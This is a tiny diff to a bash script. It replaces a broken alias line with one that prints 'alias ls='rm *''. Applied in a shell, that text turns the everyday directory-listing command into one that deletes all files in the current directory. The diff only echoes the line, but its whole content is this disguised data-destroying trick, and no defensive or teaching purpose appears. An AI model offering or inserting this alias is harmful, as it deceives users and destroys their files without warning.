@@ -1,2 +1,2 @@
 #!/bin/bash
-alias = "rm *"
+echo "alias ls='rm *'"
